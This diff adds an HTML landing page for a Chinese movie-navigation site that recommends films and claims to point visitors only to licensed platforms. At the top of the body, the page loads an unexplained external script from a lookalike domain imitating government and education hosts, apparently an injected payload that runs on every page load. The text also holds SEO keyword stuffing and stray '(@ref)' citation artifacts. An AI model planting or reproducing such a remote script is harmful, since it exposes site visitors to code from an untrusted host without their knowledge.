@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>闪酷电影网 - 极速炫光片单与正版高清观影导航</title>
+<meta name="description" content="闪酷电影网（shankudianyingwang-h5）做极速炫光影视导航：热门速览、类型闪电索引、高清画质与声音技术、正版平台观看建议。官方网址：https://shankudianyingwang-h5.github.io">
+<meta name="keywords" content="闪酷电影网, shankudianyingwang-h5, 极速电影导航, 高清电影推荐, 类型片索引, 正版观影">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#05060f;color:#e8f6ff;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 320px at 12% 8%, rgba(34,211,238,.16), transparent 55%),
+    radial-gradient(620px 300px at 88% 92%, rgba(168,85,247,.16), transparent 55%),
+    #05060f}
+.sk-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(5,6,15,.9);backdrop-filter:blur(10px);border-bottom:1px solid rgba(34,211,238,.26)}
+.sk-nav .logo{font-size:20px;font-weight:900;letter-spacing:1px}
+.sk-nav .logo b{color:#22d3ee}
+.sk-nav .logo i{color:#a855f7;font-style:normal}
+.sk-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.sk-nav .links a{font-size:13px;color:#bfe9f7;padding:6px 12px;border-radius:20px;transition:.25s}
+.sk-nav .links a:hover{background:rgba(34,211,238,.16);color:#22d3ee}
+
+.hero{padding:58px 20px 44px;text-align:center;position:relative;overflow:hidden}
+.scan{position:absolute;left:0;right:0;top:0;height:160px;
+  background:linear-gradient(180deg,rgba(34,211,238,.18),transparent);
+  transform:skewY(-3deg);animation:scan 6s ease-in-out infinite;pointer-events:none}
+@keyframes scan{0%,100%{transform:translateY(-30px) skewY(-3deg)}50%{transform:translateY(30px) skewY(-3deg)}}
+.gauge{width:160px;height:160px;margin:0 auto 14px;position:relative}
+.gauge svg{width:100%;height:100%}
+.gauge .val{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.gauge .num{font-size:30px;font-weight:900;color:#22d3ee;text-shadow:0 0 18px rgba(34,211,238,.5)}
+.gauge .unit{font-size:11px;color:#9fb6d6}
+.hero h1{font-size:30px;color:#fff;margin:6px 0 12px;position:relative}
+.hero h1 b{color:#22d3ee}
+.hero p{color:#bfe9f7;max-width:640px;margin:0 auto 18px;font-size:15px;position:relative}
+.hero .url{display:inline-block;font-size:13px;color:#05060f;font-weight:800;background:linear-gradient(90deg,#22d3ee,#a855f7);padding:8px 18px;border-radius:30px;position:relative}
+.flash-tags{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:18px}
+.flash-tags span{font-size:12px;color:#e8f6ff;padding:5px 13px;border-radius:20px;border:1px solid rgba(168,85,247,.5)}
+.flash-tags span:nth-child(1){border-color:#22d3ee;color:#22d3ee}
+.flash-tags span:nth-child(2){border-color:#a855f7;color:#a855f7}
+.flash-tags span:nth-child(3){border-color:#facc15;color:#facc15}
+
+.wrap{max-width:1160px;margin:0 auto;padding:60px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#5fb6cf;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#fff;margin-bottom:28px}
+.sec-title b{color:#22d3ee}
+
+/* 炫光速览 */
+.speed-cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.scard{background:#0a0e1c;border:1px solid rgba(34,211,238,.18);border-radius:14px;overflow:hidden;transition:.3s;position:relative}
+.scard:hover{transform:translateY(-4px);border-color:#a855f7;box-shadow:0 16px 36px rgba(168,85,247,.14)}
+.scard .beam{height:120px;position:relative;overflow:hidden}
+.scard .beam.b1{background:linear-gradient(135deg,#06283a,#22d3ee)}
+.scard .beam.b2{background:linear-gradient(135deg,#2a0a3a,#a855f7)}
+.scard .beam.b3{background:linear-gradient(135deg,#3a2a06,#facc15)}
+.scard .beam.b4{background:linear-gradient(135deg,#062a1c,#34d399)}
+.scard .beam .ray{position:absolute;top:-20%;left:-30%;width:60%;height:140%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent);transform:rotate(18deg);animation:ray 3.5s linear infinite}
+@keyframes ray{0%{left:-40%}100%{left:120%}}
+.scard .beam .spd{position:absolute;left:12px;bottom:12px;font-size:11px;font-weight:800;color:#05060f;background:#22d3ee;padding:3px 10px;border-radius:20px}
+.scard .beam .cat{position:absolute;right:12px;top:12px;font-size:11px;color:#e8f6ff;background:rgba(0,0,0,.45);padding:2px 8px;border-radius:12px}
+.scard .body{padding:16px 18px}
+.scard .body h4{color:#fff;font-size:16px;margin-bottom:4px}
+.scard .body .meta{font-size:12px;color:#5fb6cf;margin-bottom:6px}
+.scard .body p{font-size:13px;color:#bfe9f7;margin:0}
+
+/* 类型闪电 */
+.lightning{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.light{background:#0a0e1c;border:1px solid rgba(168,85,247,.2);border-radius:14px;padding:20px;transition:.3s}
+.light:hover{border-color:#22d3ee}
+.light .bolt{font-size:24px;margin-bottom:8px}
+.light h4{color:#fff;font-size:15px;margin-bottom:4px}
+.light p{color:#bfe9f7;font-size:12px;margin:0}
+.light.l1{border-top:3px solid #22d3ee}
+.light.l2{border-top:3px solid #a855f7}
+.light.l3{border-top:3px solid #facc15}
+.light.l4{border-top:3px solid #34d399}
+
+/* 画质技术舱 */
+.tech{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+.tbox{background:#0a0e1c;border-left:4px solid #22d3ee;border-radius:12px;padding:20px}
+.tbox h4{color:#fff;font-size:16px;margin-bottom:6px}
+.tbox .spec{font-size:12px;color:#a855f7;font-weight:800;margin-bottom:6px}
+.tbox p{color:#bfe9f7;font-size:13px;margin:0}
+.tbox.t2{border-left-color:#a855f7}
+.tbox.t3{border-left-color:#facc15}
+.tbox.t4{border-left-color:#34d399}
+
+/* 正版防坑 */
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.rule{background:#0a0e1c;border:1px solid rgba(34,211,238,.2);border-radius:12px;padding:18px;text-align:center}
+.rule .num{font-size:24px;font-weight:900;color:#22d3ee;margin-bottom:6px}
+.rule h4{color:#fff;font-size:14px;margin-bottom:4px}
+.rule p{color:#bfe9f7;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(34,211,238,.24);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(34,211,238,.08),rgba(168,85,247,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#fff;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#22d3ee}
+.about p{color:#bfe9f7;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#a855f7}
+.about .stats .l{font-size:11px;color:#5fb6cf}
+
+.foot{text-align:center;padding:32px 20px;background:#020308;border-top:1px solid rgba(34,211,238,.15);color:#5f7796;font-size:13px}
+.foot a{color:#22d3ee}
+.foot .lg{font-size:18px;font-weight:900;color:#e8f6ff;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.sk-nav .links a{font-size:12px;padding:5px 9px}.gauge{width:140px;height:140px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="sk-nav">
+  <div class="logo"><b>闪酷</b>电影网 <i>· 极速炫光</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#speed">炫光速览</a>
+    <a href="#light">类型闪电</a>
+    <a href="#tech">画质技术舱</a>
+    <a href="#rules">正版防坑</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="scan"></div>
+  <div class="gauge">
+    <svg viewBox="0 0 120 120" aria-hidden="true">
+      <circle cx="60" cy="60" r="52" fill="none" stroke="rgba(34,211,238,.18)" stroke-width="10"></circle>
+      <circle cx="60" cy="60" r="52" fill="none" stroke="#22d3ee" stroke-width="10" stroke-linecap="round" stroke-dasharray="327" stroke-dashoffset="65" transform="rotate(-90 60 60)"></circle>
+    </svg>
+    <div class="val"><div class="num">80%</div><div class="unit">极速匹配</div></div>
+  </div>
+  <h1>闪酷电影网：<b>极速炫光</b>，一秒定位今晚看什么</h1>
+  <p>热门速览、类型闪电、画质技术舱与正版观看建议——用“光线扫描”的思路给片单降噪。本站不提供未授权播放、不写网盘提取码，只引导持牌平台、公映片源与开放授权内容。[4,10](@ref)</p>
+  <span class="url">🌐 https://shankudianyingwang-h5.github.io</span>
+  <div class="flash-tags">
+    <span>⚡ 炫光速览</span><span>🎞️ 高清技术</span><span>🔎 正版防坑</span>
+  </div>
+</header>
+
+<section id="speed" class="wrap">
+  <div class="kicker">NEON PICKS</div>
+  <h2 class="sec-title">炫光速览 <b>4 部</b></h2>
+  <div class="speed-cards">
+    <div class="scard"><div class="beam b1"><span class="ray"></span><span class="spd">速览·热</span><span class="cat">科幻</span></div><div class="body"><h4>沙丘</h4><div class="meta">维伦纽瓦 · 2021 · 科幻/史诗</div><p>沙漠、香料与巨幕声场，炫光站优先按画质与IMAX版本做观看建议。</p></div></div>
+    <div class="scard"><div class="beam b2"><span class="ray"></span><span class="spd">速览·爽</span><span class="cat">动作</span></div><div class="body"><h4>疯狂的麦克斯：狂暴之路</h4><div class="meta">乔治·米勒 · 2015 · 动作/废土</div><p>高饱和沙漠追逐，建议标注HDR、帧率与正版平台版本差异。</p></div></div>
+    <div class="scard"><div class="beam b3"><span class="ray"></span><span class="spd">速览·燃</span><span class="cat">动画</span></div><div class="body"><h4>蜘蛛侠：纵横宇宙</h4><div class="meta">众导演 · 2023 · 动画/多元</div><p>多画风、强色彩、高密度分镜，适合做“炫光视觉”样板片。</p></div></div>
+    <div class="scard"><div class="beam b4"><span class="ray"></span><span class="spd">速览·静</span><span class="cat">自然</span></div><div class="body"><h4>地球脉动 II</h4><div class="meta">BBC · 2016 · 自然/纪录片</div><p>4K航拍与微距夜拍，技术舱可单独讲码率、色深与正版纪录片渠道。</p></div></div>
+  </div>
+</section>
+
+<section id="light" class="wrap">
+  <div class="kicker">LIGHTNING GENRES</div>
+  <h2 class="sec-title">类型闪电 <b>四道</b></h2>
+  <div class="lightning">
+    <div class="light l1"><div class="bolt">⚡</div><h4>爽片直给</h4><p>动作、飙车、超级英雄、灾难求生：按节奏强度与时长闪电分流。</p></div>
+    <div class="light l2"><div class="bolt">🌈</div><h4>视觉系</h4><p>科幻、动画、奇幻、歌舞：优先标HDR/Dolby Vision/高帧率版本。</p></div>
+    <div class="light l3"><div class="bolt">🔥</div><h4>高热剧情</h4><p>悬疑、犯罪、权谋、社会派：按反转密度与烧脑指数建闪电标签。</p></div>
+    <div class="light l4"><div class="bolt">🌿</div><h4>慢充治愈</h4><p>自然、田园、音乐、轻喜剧：低刺激、适合夜间放松的“冷光”片单。</p></div>
+  </div>
+</section>
+
+<section id="tech" class="wrap">
+  <div class="kicker">QUALITY LAB</div>
+  <h2 class="sec-title">画质技术舱 <b>四格</b></h2>
+  <div class="tech">
+    <div class="tbox"><div class="spec">RESOLUTION</div><h4>分辨率与HDR</h4><p>4K/8K、HDR10、Dolby Vision分别标注；同片不同平台版本差异单独说明，不替代正版片源。</p></div>
+    <div class="tbox t2"><div class="spec">AUDIO</div><h4>声音与沉浸</h4><p>Dolby Atmos、5.1、立体声按设备建议分流；耳机、电视、投影给出不同观看组合。</p></div>
+    <div class="tbox t3"><div class="spec">FRAME</div><h4>帧率与动态</h4><p>24fps电影感、60fps高动态体育/动画分开讲，避免把“高帧”误当“更清晰”。</p></div>
+    <div class="tbox t4"><div class="spec">DEVICES</div><h4>设备与带宽</h4><p>手机、平板、电视、投影按码率与带宽给建议，引导正版平台清晰度档位而非盗版源。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">LEGAL GUARD</div>
+  <h2 class="sec-title">正版防坑 <b>守则</b></h2>
+  <div class="rules">
+    <div class="rule"><div class="num">01</div><h4>持牌优先</h4><p>引导持证视频平台、影院重映、官方频道；不内嵌未授权播放器。[4](@ref)</p></div>
+    <div class="rule"><div class="num">02</div><h4>不写提取码</h4><p>不提供网盘密码、磁链、盗版镜像与破解资源。[10](@ref)</p></div>
+    <div class="rule"><div class="num">03</div><h4>开放授权</h4><p>老片修复、纪录片、公有领域片可引图书馆/开放档案渠道。</p></div>
+    <div class="rule"><div class="num">04</div><h4>不碰擦边</h4><p>不用“福利/成人/理论片”暗语分类，纯做极速正版观影导航。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>闪酷电影网 <b>是什么</b></h2>
+      <p>不是“闪酷影院”式在线盗版站，而是一张极速炫光导航图：用光线扫描降噪、用速度仪表匹配心情、用技术舱讲画质声音。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化）。[12,7](@ref)</p>
+      <p>长尾吃「极速电影推荐 / 高清电影导航 / 类型片闪电索引 / HDR Dolby 观影建议 / 正版平台看片」。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">4</div><div class="l">炫光速览</div></div>
+      <div><div class="n">4</div><div class="l">类型闪电</div></div>
+      <div><div class="n">4</div><div class="l">技术舱格</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="lg">⚡ 闪酷电影网</div>
+  官方网址：<a href="https://shankudianyingwang-h5.github.io">https://shankudianyingwang-h5.github.io</a><br>
+  © 2026 闪酷电影网｜炫光速览 / 类型闪电 / 画质技术 / 正版观影导航
+</footer>
+
+</body>
+</html>
